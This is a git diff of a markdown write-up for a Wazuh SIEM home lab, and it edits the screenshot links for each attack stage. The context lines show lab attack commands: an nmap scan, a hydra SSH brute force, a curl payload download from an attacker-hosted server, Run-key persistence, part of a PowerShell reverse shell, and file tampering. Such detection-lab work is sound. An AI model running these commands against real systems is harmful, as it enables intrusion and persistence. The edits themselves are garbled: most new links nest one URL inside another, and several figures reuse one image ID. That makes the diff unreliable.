@@ -130,7 +130,7 @@ nmap -sS -T4 -p- 192.168.60.1
 ping -c 5 192.168.60.1
 ```
 
-![Figure 2 — Stage 1 evidence screenshot](https://hackmd.io/_uploads/Sk-LnqADfl.png)
+![Figure 2 — Stage 1 evidence screenshot](https://hackmd.io/_uploads/Sk-LnqADfl.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage1_recon.png))
 
 *Figure 2 — Stage 1: reconnaissance evidence screenshot (as placed in the original writeup).*
 
@@ -161,7 +161,7 @@ ping -c 5 192.168.60.1
 hydra -L user.txt -P password.txt ssh://192.168.60.1
 ```
 
-![Figure 3 — Stage 2 evidence screenshot](https://hackmd.io/_uploads/S1wGXj0Dfg.png)
+![Figure 3 — Stage 2 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage2_bruteforce.png)
 
 *Figure 3 — Stage 2: brute-force evidence screenshot (as placed in the original writeup).*
 
@@ -191,7 +191,7 @@ hydra -L user.txt -P password.txt ssh://192.168.60.1
 ssh lenovo@192.168.60.1
 ```
 
-![Figure 4 — Stage 3 evidence screenshot](https://hackmd.io/_uploads/H1kimjADMx.png)
+![Figure 4 — Stage 3 evidence screenshot](https://hackmd.io/_uploads/H1kimjADMx.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage3_access.png))
 
 *Figure 4 — Stage 3 evidence screenshot (as placed in the original writeup).*
 
@@ -259,7 +259,7 @@ systeminfo
 tasklist
 ```
 
-![Figure 5 — Stage 5 evidence screenshot](https://hackmd.io/_uploads/Byvden0DGe.png)
+![Figure 5 — Stage 5 evidence screenshot](https://hackmd.io/_uploads/Byvden0DGe.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage5_discovery.png))
 
 *Figure 5 — Stage 5 evidence screenshot (as placed in the original writeup).*
 
@@ -296,11 +296,11 @@ python3 -m http.server 8000
 curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com"
 ```
 
-![Figure 6 — Stage 6 evidence screenshot 1 of 3](https://hackmd.io/_uploads/ryHT4hRwze.png)
+![Figure 6 — Stage 6 evidence screenshot 1 of 3](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload1.png))
 
-![Figure 7 — Stage 6 evidence screenshot 2 of 3](https://hackmd.io/_uploads/SJWGU3Avzl.png)
+![Figure 7 — Stage 6 evidence screenshot 2 of 3](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload2.png))
 
-![Figure 8 — Stage 6 evidence screenshot 3 of 3](https://hackmd.io/_uploads/SJpRYnCDze.png)
+![Figure 8 — Stage 6 evidence screenshot 3 of 3](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload3.png))
 
 *Figures 6–8 — Stage 6: the three alerts raised by one download (Suricata, FIM, VirusTotal), as placed in the original writeup.*
 
@@ -330,7 +330,7 @@ curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterSvc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
 ```
 
-![Figure 9 — Stage 7 evidence screenshot](https://hackmd.io/_uploads/S1Y8phADfe.png)
+![Figure 9 — Stage 7 evidence screenshot](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage7_persistence.png))
 
 *Figure 9 — Stage 7 evidence screenshot (as placed in the original writeup).*
 
@@ -380,7 +380,7 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 $client.Close()
 ```
 
-![Figure 10 — Stage 8 evidence screenshot](https://hackmd.io/_uploads/H1w00Wx_Gg.png)
+![Figure 10 — Stage 8 evidence screenshot](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage8_C2.png))
 
 *Figure 10 — Stage 8 evidence screenshot (as placed in the original writeup).*
 
@@ -435,7 +435,7 @@ Add-Content -Path C:\Users\LENOVO\Downloads\virustotaltest\eicar.com -Value "mod
 Remove-Item C:\Users\LENOVO\Downloads\virustotaltest\eicar2.txt -Force
 ```
 
-![Figure 11 — Stage 9 evidence screenshot](https://hackmd.io/_uploads/S1moKGxdMe.png)
+![Figure 11 — Stage 9 evidence screenshot](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage9_fim.png))
 
 *Figure 11 — Stage 9: file modified and file deleted, as placed in the original writeup.*
 
